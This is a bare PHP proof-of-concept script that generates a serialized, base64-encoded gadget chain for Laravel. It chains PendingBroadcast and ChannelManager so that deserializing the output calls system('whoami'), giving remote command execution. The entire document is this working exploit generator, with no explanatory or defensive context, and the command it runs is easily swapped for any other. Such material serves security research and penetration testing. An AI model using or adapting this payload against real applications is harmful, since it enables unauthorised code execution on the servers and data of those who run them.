<?php

namespace Illuminate\Broadcasting
{
    class PendingBroadcast
    {
        protected $events;
        function __construct($class)
        {
            $this->events = $class;
        }
    }
}


namespace Illuminate\Notifications
{
    class ChannelManager
    {
        protected $defaultChannel;
        protected $container;
        protected $customCreators = [];

        function __construct($function, $parameter)
        {
            $this->defaultChannel = "test";
            $this->container = $parameter;
            $this->customCreators = [
                "test" => $function
            ];
        }
    }
}

namespace {
    $dispatcher = new Illuminate\Notifications\ChannelManager("system", "whoami");
    $pendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispatcher);
    print_r(base64_encode(serialize($pendingBroadcast)));
}